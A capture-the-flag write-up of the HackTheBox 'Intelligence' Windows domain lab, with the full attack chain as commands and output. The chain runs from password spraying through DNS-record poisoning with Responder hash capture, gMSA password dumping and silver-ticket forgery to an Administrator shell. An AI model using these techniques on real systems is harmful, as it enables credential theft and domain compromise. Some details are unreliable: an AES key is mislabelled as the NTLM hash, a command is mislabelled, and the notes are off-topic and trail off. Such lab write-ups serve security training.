---
description: >-
  Intelligence HTB Machine
title: Intelligence (Medium)                # Add title here
date: 2023-05-30 08:00:00 -0600                           # Change the date to match completion date
categories: [HackTheBox, Windows - Medium]                     # Change Templates to Writeup
tags: [hackthebox, intelligence, ]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: true                                    # Change this to true
image: /assets/img/icons/Intelligence.png                # Add infocard image here for post preview image
---
### Host entries:
```bash
10.10.10.248    intelligence.htb dc.intelligence.htb
```
If Active Directory => [NTP Synchronization](https://shuciran.github.io/posts/NTP-Synchronization/) with the domain controller.

### Content

- Information Leakage
- Kerberos Enumeration (Kerbrute)
- Creating a DNS Record (dnstool.py)
- Intercepting Net-NTLMv2 Hashes with Responder
- BloodHound Enumeration
- Abusing ReadGMSAPassword Rights (gMSADumper)
- Pywerview Usage
- Abusing Unconstrained Delegation
- Abusing AllowedToDelegate Rights (getST.py) (User Impersonation)
- Using .ccache file with wmiexec.py (KRB5CCNAME)

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
nmap -p- --min-rate 5000 --open -Pn -n -vvv -oG allPorts 10.10.10.248
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.248 ()   Status: Up
Host: 10.10.10.248 ()   Ports: 53/open/tcp//domain///, 80/open/tcp//http///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 49667/open/tcp/////, 49691/open/tcp/////, 49692/open/tcp/////, 49702/open/tcp/////, 49714/open/tcp/////
```
Services and Versions running:
```bash
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49691,49692,49702,49714 -Pn -n -vvvv -oN targeted 10.10.10.248
Nmap scan report for 10.10.10.248
Host is up, received user-set (0.16s latency).
Scanned at 2023-05-30 22:25:43 EDT for 100s

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Intelligence
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-05-31 09:25:51Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767953367fbd65d6065dff77ad83e88
| SHA-1: 155529d9fef81aec41b7dab284d70f9d30c7bde7
| -----BEGIN CERTIFICATE-----
| MIIF+zCCBOOgAwIBAgITcQAAAALMnIRQzlB+HAAAAAAAAjANBgkqhkiG9w0BAQsF
<SNIP>
| z4fcj1sme6//eFq7SKNiYe5dEh4SZPB/5wkztD1yt5A6AWaM+naj/0d8K0tcxSY=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-05-31T09:27:23+00:00; +7h00m01s from scanner time.
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767953367fbd65d6065dff77ad83e88
| SHA-1: 155529d9fef81aec41b7dab284d70f9d30c7bde7
| -----BEGIN CERTIFICATE-----
| MIIF+zCCBOOgAwIBAgITcQAAAALMnIRQzlB+HAAAAAAAAjANBgkqhkiG9w0BAQsF
<SNIP>
| z4fcj1sme6//eFq7SKNiYe5dEh4SZPB/5wkztD1yt5A6AWaM+naj/0d8K0tcxSY=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-05-31T09:27:24+00:00; +7h00m01s from scanner time.
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-31T09:27:23+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767953367fbd65d6065dff77ad83e88
| SHA-1: 155529d9fef81aec41b7dab284d70f9d30c7bde7
| -----BEGIN CERTIFICATE-----
| MIIF+zCCBOOgAwIBAgITcQAAAALMnIRQzlB+HAAAAAAAAjANBgkqhkiG9w0BAQsF
<SNIP>
| z4fcj1sme6//eFq7SKNiYe5dEh4SZPB/5wkztD1yt5A6AWaM+naj/0d8K0tcxSY=
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-31T09:27:24+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767953367fbd65d6065dff77ad83e88
| SHA-1: 155529d9fef81aec41b7dab284d70f9d30c7bde7
| -----BEGIN CERTIFICATE-----
| MIIF+zCCBOOgAwIBAgITcQAAAALMnIRQzlB+HAAAAAAAAjANBgkqhkiG9w0BAQsF
<SNIP>
| z4fcj1sme6//eFq7SKNiYe5dEh4SZPB/5wkztD1yt5A6AWaM+naj/0d8K0tcxSY=
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49691/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack Microsoft Windows RPC
49702/tcp open  msrpc         syn-ack Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

By enumerating the web server we identify the following links to download two different files:

![Web-Server-Download](/assets/img/Pasted image 20230530213130.png)

### Exploitation
Accessing this links, we identify a pattern on both files `http://intelligence.htb/documents/2020-12-15-upload.pdf` and `http://intelligence.htb/documents/2020-01-01-upload.pdf` as we can see this seems to be an static link with a slightly difference which is the dates, so let's proceed to create a python script that creates a datelist:
```python
from datetime import datetime
import pandas as pd

# start date
start_date = datetime.strptime("2020-01-01", "%Y-%m-%d")
end_date = datetime.strptime("2020-12-31", "%Y-%m-%d")

# difference between each date. D means one day
days = 365

date_list = pd.date_range(start_date, periods=days).tolist()
#print(f"Creating list of dates starting from {start_date} to {end_date}")
#print(date_list)

# if you want dates in string format then convert it into string
#dates=date_list.strftime("%Y-%m-%d")
for i in range(0,days):
        print(date_list[i])
```
And then we print the results within a file:
```bash
python3 dates.py > dates
```
Since the results are in the format `2020-06-22 00:00:00` we need to treat the results we can do that with `sponge` and `cut` commands:
```bash
cat dates | cut -d " " -f1 | sponge dates
```
Then we have the list of dates needed to download all the URLs with a file inside, since the dates are only for 2020 year then we'll download from 2020-01-01 until 2020-12-31:
```bash
for i in $(cat dates); do wget http://intelligence.htb/documents/$i-upload.pdf ; done
```

Finally, we use the tool `pdfgrep` to search for strings such as `password` within the downloaded files:
```bash
pdfgrep 'password' *.pdf  
2020-06-04-upload.pdf:Please login using your username and the default password of:
2020-06-04-upload.pdf:After logging in please change your password as soon as possible.
```
Within this pdf we found a password `NewIntelligenceCorpUser9876`:
![Downloadable-Content-With-Password](/assets/img/Pasted image 20230530214716.png)

Now we need to search for a user, we can use the same command as before but unfortunately this is unsuccessful:
```bash
pdfgrep 'user' *.pdf    
2020-06-04-upload.pdf:Please login using your username and the default password of:
```
So let's try with an `exiftool` command over all the pdfs and extract a list of possible users as using `grep`, `tr` and `cut`:
```bash
exiftool *.pdf | grep Creator | tr -d " " | cut -d ":" -f2 > users
```
### User Privilege Escalation

Now that we have credentials we can execute a [Password Spraying](https://shuciran.github.io/posts/Password-Spraying/) [^password-spraying] attack on winrm service:
```bash
crackmapexec winrm 10.10.10.248 -u users -p 'NewIntelligenceCorpUser9876' --continue-on-success
SMB         10.10.10.248    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:intelligence.htb)
<SNIP>
WINRM       10.10.10.248    5985   DC               [-] intelligence.htb\JACK.O'BRIEN:NewIntelligenceCorpUser9876
WINRM       10.10.10.248    5985   DC               [-] intelligence.htb\JACK.WATTS:NewIntelligenceCorpUser9876
WINRM       10.10.10.248    5985   DC               [-] intelligence.htb\JACK.ROSE:NewIntelligenceCorpUser9876
```
Unsuccessful response, so let's try the same attack but for SMB:
```bash
crackmapexec smb 10.10.10.248 -u users -p 'NewIntelligenceCorpUser9876' --continue-on-success 
SMB      10.10.10.248    445    DC   [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) 
SMB      10.10.10.248    445    DC   [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB      10.10.10.248    445    DC   [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876  
<SNIP>
SMB      10.10.10.248    445    DC   [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB      10.10.10.248    445    DC   [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB      10.10.10.248    445    DC   [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
<SNIP> 
SMB      10.10.10.248    445    DC   [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
```
Credentials work for user `Tiffany.Molina` on service SMB, however let's try with ldap as well:
```bash
crackmapexec smb 10.10.10.248 -u users -p 'NewIntelligenceCorpUser9876' --continue-on-success 
LDAP   10.10.10.248  445  DC  [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True)
LDAP   10.10.10.248  445  DC  [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
LDAP   10.10.10.248  445  DC  [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876  
<SNIP>
LDAP   10.10.10.248  445  DC  [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
LDAP   10.10.10.248  445  DC  [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
LDAP   10.10.10.248  445  DC  [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
<SNIP> 
LDAP   10.10.10.248  445  DC  [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
```
Since we have access to both SMB and LDAP services, we then proceed to execute a basic enumeration on SMB, first with crackmapexec let's enumerate the shares available:

```bash
crackmapexec smb 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --shares
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.10.10.248    445    DC               [+] Enumerated shares
SMB         10.10.10.248    445    DC               Share           Permissions     Remark
SMB         10.10.10.248    445    DC               -----           -----------     ------
SMB         10.10.10.248    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.248    445    DC               C$                              Default share
SMB         10.10.10.248    445    DC               IPC$            READ            Remote IPC
SMB         10.10.10.248    445    DC               IT              READ            
SMB         10.10.10.248    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.248    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.248    445    DC               Users           READ
```
If we access the share `Users`, we then can see the content and inside of our user's Desktop folder we find the first flag:
```bash
smbclient //10.10.10.248/Users -U 'Tiffany.Molina'
smb: \Tiffany.Molina\Desktop\> dir
  .                                  DR        0  Sun Apr 18 20:51:46 2021
  ..                                 DR        0  Sun Apr 18 20:51:46 2021
  user.txt                           AR       34  Wed May 31 05:23:02 2023
```
Also, another share worth to inspect is the `IT` which contains a file called `downdetector.ps1`:
```bash
smbclient //10.10.10.248/IT -U 'Tiffany.Molina'                                            
Password for [WORKGROUP\Tiffany.Molina]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Apr 18 20:50:55 2021
  ..                                  D        0  Sun Apr 18 20:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021
```
The content of such powershell script is as follows:
```powershell
cat downdetector.ps1
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```
If we inspect the code, we identify that there is an LDAP record on it pointing to the `intelligence.htb` domain, so if we try to reach this domain with ldapsearch using `Tiffany.Molina`, then we can extract interesting information as follows:
```bash
ldapsearch -x -H ldap://10.10.10.248 -D "INTELLIGENCE\Tiffany.Molina" -w 'NewIntelligenceCorpUser9876' -b 'DC=intelligence,DC=htb'

# intelligence.htb
dn: DC=intelligence,DC=htb
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=intelligence,DC=htb
instanceType: 5
whenCreated: 20210419004205.0Z

<SNIP>

uSNChanged: 102473
showInAdvancedViewOnly: TRUE
name: DomainDnsZones
objectGUID:: eLyYwHfSC0OtfPSObaRlWg==
dnsRecord:: EAAcAAXwAABJAAAAAAACWAAAAAD5fzgA3q2+7wAAAAANuCywduzFAg==
dnsRecord:: EAAcAAXwAABJAAAAAAACWAAAAAD5fzgA3q2+7wAAAAAAAAAAAAACOw==
dnsRecord:: BAABAAXwAABJAAAAAAACWAAAAAD5fzgACgoK+A==
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
dSCorePropagationData: 16010101000000.0Z
dNSTombstoned: FALSE
dc: DomainDnsZones

# search result
search: 2
result: 0 Success

# numResponses: 20
# numEntries: 19
```
Unfortunately there is no information that helps us to access the machine, so let's take another look into the code, specially this two lines of code:
```bash
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
```
As we can see, the code is browsing for LDAP records with the `Where-Object` searching for names of LDAP opbjects that start with `web` and follows with any other character, then it iterate every one of them to send a web request using `Invoke-WebRequest`, we can abuse this by trying to add our own record into the LDAP registry, for that we can abuse the tool [dnstool.py](https://github.com/dirkjanm/krbrelayx) which is used to add DNS records through LDAP[^ldap-record-addition], since this is what we are looking for, then let's execute the following command:
```bash
python3 dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -r webos1 -a add -t A -d 10.10.16.7 10.10.10.248
```
Once added, and because the code is executing the `Invoke-WebRequest` with the flag `-UseDefaultCredentials` that means that a web server request will be made and since credentials travel via SMB then an excellent option to capture both is to start a Responder[^responder] instance:
```bash
sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
```
And finally let's wait for the web server request from the `downdetector.ps1` and after a while, we get the following response:
```bash
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:91b2324aeca226f0:FEA2F85731C003E7132D55D22FA50A60:0101000000000000E8DA88110B94D901E6919571B0EFFF2B00000000020008004C00500055005A0001001E00570049004E002D0057004D00360045004A00320048005A00340054003500040014004C00500055005A002E004C004F00430041004C0003003400570049004E002D0057004D00360045004A00320048005A003400540035002E004C00500055005A002E004C004F00430041004C00050014004C00500055005A002E004C004F00430041004C00080030003000000000000000000000000020000078CF3A18390576363D2E8DE1DCC6894DD26A91909E0B4739A678DE59B8E0891A0A001000000000000000000000000000000000000900360048005400540050002F007700650062006F0073002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```
After cracking the hash with [Hashcat](https://shuciran.github.io/posts/Hashcat/) we extract the following password:
```powershell
Mr.Teddy
```
### Root privesc

After trying to access via `evil-winrm` unsuccessfully, now is time to think out of the box, the main idea is that if we have open ports tcp-53 and tcp-389 which corresponds to DNS and LDAP respectively, then we can execute [bloodhound.py](https://shuciran.github.io/posts/Bloodhound/)[^bloodhound-python] to extract useful information to escalate our privileges:
```bash
bloodhound.py -c All -u 'Ted.Graves' -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb
```
From Bloodhound we receive the following results:
![Bloodhound-Results](/assets/img/Pasted image 20230601074941.png)

After searching about how to execute a `ReadGMSAPassword` from our user, an excellent technique to obtain the GMSA password is abusing of [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper) as follows:
```bash
/usr/share/privesc/Windows/gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::fca9edf1c9fb8f031dfc38d918279642
svc_int$:aes256-cts-hmac-sha1-96:15516a903b67ce2aacda697b76fae9c2d1fc60e3408abc6587b2faeefb6bfac2
svc_int$:aes128-cts-hmac-sha1-96:4e25dcda503a43e8757abe3081892114
```
Now that we have the NTLM hash, and after try to authenticate to the multiple services exposed on the machine (LDAP,SMB and WINRM) it's time to execute another attack such as Silver Ticket[^silver-ticket] by crafting it with `impacket-getST`, but first we need an SPN and de SID of the DC.
To retrieve the SID we can abuse of `impacket-getPac` to extract it:
```bash
impacket-getPac intelligence.htb/Ted.Graves:Mr.Teddy -targetUser Administrator
<SNIP>
ResourceGroupCount:              1 
ResourceGroupIds:               
    [
         
        RelativeId:                      572 
        Attributes:                      536870919 ,
    ] 
Domain SID: S-1-5-21-4210132550-3389855604-3437519686
```
And the SPN can be extracted from Bloodhound in the extra properties of the user `svc_int`:
![SPN-Bloodhound](/assets/img/Pasted image 20230601093711.png)

And finally we have this information to abuse `impacket-ticketer`:
```bash
SPN: WWW/dc.intelligence.htb
SID: S-1-5-21-4210132550-3389855604-3437519686
NTLM: 4e25dcda503a43e8757abe3081892114
```
Executing the following command, we can craft a silver ticket:
```bash
impacket-ticketer -spn WWW/dc.intelligence.htb -nthash 4e25dcda503a43e8757abe3081892114 -domain-sid S-1-5-21-4210132550-3389855604-3437519686 -dc-ip dc1.intelligence.htb Administrator -domain intelligence.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for intelligence.htb/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```
Then we can execute the `impacket-wmiexec` to access the machine:
```bash
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass dc.intelligence.htb
C:\>whoami
intelligence\administrator
```
AND WE ARE INSIDE!!!
### Post Exploitation
It is also possible to craft a silver ticket[^silver-ticket-impacket-getst] with `impacket-getST` as follows:
```bash
impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :4e25dcda503a43e8757abe3081892114
```

### Credentials
```bash
Tiffany.Molina:NewIntelligenceCorpUser9876
Ted.Graves:Mr.Teddy
svc_int:4e25dcda503a43e8757abe3081892114 <- NTLM Hash
```

### Notes

-   Chisel have different configurations, this time we use a Forward SOCKS Proxy, which is a bind shell, that is not neccessarily the easiest way to forward the remote port, but is a new way to consider in case that a reverse shell is not possible.
-   Always look for exploits, analyze them and check if something can be useful to exploit the machine.
-   Chisel has some

### Resources

[^password-spraying]: Password Spraying
[^ldap-record-addition]: LDAP Record Addition with dnstool.py
[^responder]: LLMNR Attack poisoning the network and steal hashes
[^bloodhound-python]: Bloodhound Python to execute outside of the machine with credentials
[^silver-ticket]: Silver Ticket Attack
[^silver-ticket-impacket-getst]: Impacket-getST can be abused as well to craft a silver ticket